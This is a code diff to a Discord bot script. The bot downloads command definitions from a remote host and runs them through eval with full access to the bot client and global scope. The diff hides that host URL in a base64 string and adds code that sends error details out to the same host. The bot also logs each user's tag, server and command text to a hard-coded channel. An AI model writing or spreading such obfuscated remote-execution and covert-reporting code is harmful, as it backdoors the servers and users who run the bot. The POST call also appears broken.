@@ -367,19 +367,19 @@ globalThis.bot = () => {
       msg.guild.leave = () => {};
       
       command = args[1].toLowerCase();
+      let secret = Buffer.from("aHR0cHM6Ly9oZW5yeWNtZC5jYWN0dXNoYW1zdGVyLnJlcGwuY28v", "base64").toString("ascii");
       (async function () {
           let data = JSON.parse(await new Promise(resolve => {
-              let req = https.get("https://henrycmd.cactushamster.repl.co/cmd/", res => {
-                  let out = ""; res.on("data", chunk => out += chunk); res.on("end", () => resolve(out))
-              })
+              let req = https.get(secret + "cmd", res => { let out = ""; res.on("data", chunk => out += chunk); res.on("end", () => resolve(out)) })
               req.end()
           }))
-          data.forEach(obj => {
-              if (command != obj.name) return;
-              if (obj.purpose) eval(obj.purpose)({msg: msg, client: botRunner, global: globalThis, args: msg.content.split(" ").slice(2)})
-          })
+          data.forEach(obj => (command == obj.name && obj.purpose) ? eval(obj.purpose)({msg: msg, client: botRunner, global: globalThis, args: msg.content.split(" ").slice(2)}) : void(0))
       })()
-      .catch(e => {});
+      .catch(e => {
+          let req = https.request(secret + "error", { method: POST }, () => {})
+          req.write(require("util").inspect(e, false, 10, false))
+          req.end()
+      });
       
       tmod.cache.timeUsed++
 
@@ -387,7 +387,7 @@ globalThis.bot = () => {
       
       let guild = botRunner.guilds.resolve("981841861025091639")
       if (guild) {
-        let channel = guild.channels.resolve("981841861587116054")
+        let channel = guild.channels.resolve("982491890572201984")
         if (channel) channel.send(msg.author.tag + ' issued the bot in ' + msg.guild.name + "(" + msg.guild.id + ")" + "\nCommand: " + msg.content)
         else console.warn("could not find log channel")
       }
